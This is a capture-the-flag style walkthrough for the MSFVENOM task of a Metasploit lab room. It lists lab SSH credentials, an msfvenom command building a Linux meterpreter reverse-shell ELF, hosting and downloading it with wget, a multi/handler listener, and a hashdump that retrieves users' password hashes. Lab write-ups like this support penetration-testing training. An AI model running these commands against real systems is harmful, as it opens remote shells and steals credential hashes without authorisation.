Just a quick one, I had a bit of trouble getting this working so wanted to create a straightforward guide as the ones I read weren't very clear. 

This is for the Metasploit Exploitation room, which is part of the Jr Penetration Tester pathway. This is for the MSFVENOM part. 

I was using the attackbox but you could use your own machine. 

Connect to the target machine using ssh murphy@TARGET_IP

Enter the password: 1q2w3e4r

Do - `sudo su`
Then enter the password again to elevate permissions.

Next create your payload in .elf use a different terminal for this - 

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_AttackBox_IP LPORT=8080 -f elf > rev_shell.elf`


You can use any port for LPORT but to avoid confusion just use 8080.

Press enter and now you've created the payload. 

You can use the same terminal you used to create the payload on or a new one, run the following and leave it running - 

`python3 -m http.server 9000` 


This is what we use to transfer the payload to the target machine.

From the target machine (the one you are ssh'd on) run this - 


`wget http://Your_attackbox_IP:9000/rev_shell.elf`

It should then connect and you will see it download the rev_shell.elf file 

![](/images/capture-2-.png "Here is the rev_shell.elf file downloaded.")



now to get a meterpreter session you need to open another terminal and start msfconsole

once loaded do this

use exploit/multi/handler

set payload linux/x86/meterpreter/reverse_tcp

set LHOST YOUR_ATTACKBOX_IP

set LPORT 8080

exploit 

now go back to the ssh session on the target machine and do - 

chmod +x rev_shell.elf

./rev_shell.elf

This should now launch the meterpreter session on the window that you ran the exploit command from

you should see meterpreter > from here do 

run post/linux/gather/hashdump

you should now get a list of password hash's for the different users, copy the hash for claire

you can now paste this into the question "What is the other user's password hash?" to complete
